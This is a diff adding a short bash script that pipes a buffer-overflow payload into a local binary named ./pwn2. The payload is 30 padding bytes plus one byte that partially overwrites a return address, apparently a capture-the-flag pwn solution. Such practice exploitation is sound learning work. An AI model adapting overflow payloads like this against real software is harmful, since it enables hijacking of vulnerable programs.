@@ -1,0 +1,2 @@
+#!/bin/bash
+python3 -c "from pwn import *; sys.stdout.buffer.write(b'A'*30+b'\xd8')" | ./pwn2
